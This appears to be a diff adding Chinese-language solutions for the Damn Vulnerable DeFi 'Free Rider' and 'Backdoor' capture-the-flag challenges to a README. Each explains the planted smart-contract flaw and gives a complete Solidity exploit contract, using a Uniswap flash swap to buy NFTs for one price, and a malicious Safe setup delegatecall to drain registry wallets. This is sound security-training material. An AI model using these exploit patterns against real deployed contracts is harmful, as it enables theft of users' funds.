@@ -558,3 +558,228 @@ contract Exploit {
   after alculateDepositOfWETHRequired 29496494833197321980
 
 ```
+
+### Free Rider
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/free-rider/): 一個全新的Damn Valuable NFTs市場已經發布！市場上有6個NFT被首次鑄造，現已開放出售，每個價格為15 ETH。有一個關鍵漏洞被報告，聲稱所有的代幣都可以被奪走。然而，開發者們不知道如何拯救這些代幣！他們提供了一個45 ETH的賞金，給任何願意將這些NFT取出並送回給他們的人。回收過程由一個專門的智能合約管理。你已經同意幫忙。儘管如此，你的餘額只有0.1 ETH。開發者們對你要求更多資金的消息卻毫無回應。如果你能獲得免費的ETH，至少瞬間獲得一些該多好。
+
+過關條件:
+- 需要確保所有的NFT從recoveryManager智能合約中提取出來，並且轉移到recoveryManagerOwner的地址
+- 市場上應該不再有任何NFT待售，這表示市場中的offersCount()應該為0
+- player 的餘額必須大於或等於賞金的數量
+
+解題:
+- 在買 NFT 的_buyOne function 中有一個錯誤檢查金額的地方. 只要msg.value大於priceToPay就可以通過. 
+```
+        if (msg.value < priceToPay) {
+            revert InsufficientPayment();
+        }
+```
+-  如果只是買一張NFT是沒問題, 但合約提供一次可以購買多張NFT. 透過 buyMany() loop執行 _buyOne, 這樣就會有一個邏輯漏洞, 只要有15ETH(1張NFT價格)就可以買多個NFT.
+```
+    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
+        for (uint256 i = 0; i < tokenIds.length; ++i) {
+            unchecked {
+                _buyOne(tokenIds[i]);
+            }
+        }
+    }
+```
+- 第二個邏輯錯誤也是在 _buyOne裡面, 當購買的NFT後會把15ETH轉給賣家. 但從程式中顯轉移NFT擁有權, 所以會把15ETH轉給買家了.
+```
+        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+
+        // pay seller using cached token
+        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+```
+- 搭配以上兩個bug, 可以免費透過 uniswapV2 flashswap 借出15ETH來購買多張NFT, 最後我們的成本僅需 0.3% flashswap fee. 題目預設給我們0.1ETH,所以很足夠.
+- 最後一個步驟就是要買6張NFT, 都轉移給 FreeRiderRecoveryManager, 就可以拿到45ETH賞金了. [REF](https://medium.com/@JohnnyTime/damn-vulnerable-defi-v3-challenge-10-solution-free-rider-complete-walkthrough-7da8122691b3)
+```
+        if (++received == 6) {
+            address recipient = abi.decode(_data, (address));
+            payable(recipient).sendValue(bounty);
+        }
+```
+[POC](./damn-vulnerable-defi/test/free-rider/FreeRider.t.sol) : 
+
+```
+    function test_freeRider() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit{value:0.045 ether}(
+            address(uniswapPair),
+            address(marketplace),
+            address(weth),
+            address(nft),
+            address(recoveryManager)
+        );
+        exploit.attack();
+        console.log("balance of attacker:", address(player).balance / 1e15, "ETH");
+    }
+contract Exploit {
+    
+    IUniswapV2Pair public pair;
+    IMarketplace public marketplace;
+    IWETH public weth;
+    IERC721 public nft;
+    address public recoveryContract;
+    address public player;
+    uint256 private constant NFT_PRICE = 15 ether;
+    uint256[] private tokens = [0, 1, 2, 3, 4, 5];
+
+    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract)payable{
+        pair = IUniswapV2Pair(_pair);
+        marketplace = IMarketplace(_marketplace);
+        weth = IWETH(_weth);
+        nft = IERC721(_nft);
+        recoveryContract = _recoveryContract;
+        player = msg.sender;
+    }
+
+    function attack() external payable {
+         // 1. Request a flashSwap of 15 WETH from Uniswap Pair  
+        pair.swap(NFT_PRICE, 0, address(this), "1");
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+
+        // Access Control
+        require(msg.sender == address(pair));
+        require(tx.origin == player);
+
+        // 2. Unwrap WETH to native ETH
+        weth.withdraw(NFT_PRICE);
+
+        // 3. Buy 6 NFTS for only 15 ETH total
+        marketplace.buyMany{value: NFT_PRICE}(tokens);
+
+        // 4. Pay back 15WETH + 0.3% to the pair contract
+        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
+        weth.deposit{value: amountToPayBack}();
+        weth.transfer(address(pair), amountToPayBack);
+
+        // 5. Send NFTs to recovery contract so we can get the bounty
+        bytes memory data = abi.encode(player);
+        for(uint256 i; i < tokens.length; i++){
+            nft.safeTransferFrom(address(this), recoveryContract, i, data);
+        }
+        
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+
+}
+```
+
+### Backdoor
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/backdoor/): 為了激勵團隊成員創建更安全的錢包，有人部署了一個Safe錢包的註冊表。當團隊中的某個人部署並註冊一個錢包時，他們會獲得10個DVT代幣。這個註冊表與合法的Safe代理工廠（Safe Proxy Factory）緊密集成，並且包括嚴格的安全檢查。目前，有四個人被註冊為受益人：Alice、Bob、Charlie和David。註冊表中有40個DVT代幣餘額，準備分配給他們。找出註冊表中的漏洞，救出所有資金，並將它們存入指定的回收賬戶。並且在一次交易中完成。
+
+過關條件:
+- 只執行了一次交易
+- 所有被列為受益人的用戶都必須已經在註冊表中註冊了一個錢包地址
+- 用戶不再是受益人
+- 所有代幣都被轉移到 recovery 錢包
+
+解題:
+- Safe = singletonCopy, SafeProxyFactory = walletFactory
+- create a new Safe wallet: SafeProxyFactory.createProxyWithCallback -> createProxyWithNonce -> deployProxy -> ( if callback is defined ) callback.proxyCreated
+- 題目有4位受益人, 透過 WalletRegustry 建立合錢包每一位會拿到10ETH. 在 function proxyCreated 的備註提到建立錢包是透過 SafeProxyFactory::createProxyWithCallback, 可以從以下看到 createProxyWithCallback的code. 
+```
+     * @notice Function executed when user creates a Safe wallet via SafeProxyFactory::createProxyWithCallback
+     *          setting the registry's address as the callback.
+    function proxyCreated
+
+    function createProxyWithCallback(
+        address _singleton,
+        bytes memory initializer,
+        uint256 saltNonce,
+        IProxyCreationCallback callback
+    ) public returns (SafeProxy proxy) {
+        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
+        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
+        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
+    }
+```
+- 在 initializer 最後在 deployProxy 執行,且是我們可以控制的, call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0). 所以我們可以在initializer中執行 Safe.setup, 然後控制第三個欄位 to, Contract address for optional delegate call. 指定一個任意合約或有後門的合約. 最後在第4個欄位data 可以執行 Data payload for optional delegate call.搭配以上流程就可以拿到每一個受益人的ETH.
+```
+    function setup(
+        address[] calldata _owners, //List of Safe owners.
+        uint256 _threshold, //Number of required confirmations for a Safe transaction.
+        address to, //   Contract address for optional delegate call.
+        bytes calldata data, //Data payload for optional delegate call.
+        address fallbackHandler
+    ) 
+```
+
+[POC](./damn-vulnerable-defi/test/backdoor/Backdoor.t.sol) :
+```
+    function test_backdoor() public checkSolvedByPlayer {
+             Exploit exploit = new Exploit(address(singletonCopy),address(walletFactory),address(walletRegistry),address(token),recovery);
+             exploit.attack(users);
+    }
+contract Exploit {
+    address private immutable singletonCopy;
+    address private immutable walletFactory;
+    address private immutable walletRegistry;
+    DamnValuableToken private immutable dvt;
+    address recovery;
+
+    constructor(
+        address _masterCopy,
+        address _walletFactory,
+        address _registry,
+        address _token,
+        address _recovery
+    ) {
+        singletonCopy = _masterCopy;
+        walletFactory = _walletFactory;
+        walletRegistry = _registry;
+        dvt = DamnValuableToken(_token);
+        recovery = _recovery;
+    }
+
+    function delegateApprove(address _spender) external {
+        dvt.approve(_spender, 10 ether);
+    }
+
+    function attack(address[] memory _beneficiaries) external {
+        // For every registered user we'll create a wallet
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = _beneficiaries[i];
+
+            // Create the data that will be passed to the proxyCreated function on WalletRegistry
+            // The parameters correspond to the GnosisSafe::setup() contract
+            bytes memory _initializer = abi.encodeWithSelector(
+                Safe.setup.selector, // Selector for the setup() function call
+                beneficiary, // _owners =>  List of Safe owners.
+                1, // _threshold =>  Number of required confirmations for a Safe transaction.
+                address(this), //  to => Contract address for optional delegate call.
+                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
+                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
+                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
+                0, // payment => Value that should be paid
+                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
+            );
+
+            // Create new proxies on behalf of other users
+        SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
+         singletonCopy,  // _singleton => Address of singleton contract.
+         _initializer,   // initializer => Payload for message call sent to new proxy contract.
+         i,              // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
+         IProxyCreationCallback(walletRegistry)  // callback => Cast walletRegistry to IProxyCreationCallback
+);
+            //Transfer to caller
+            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
+        }
+    }
+}
+```
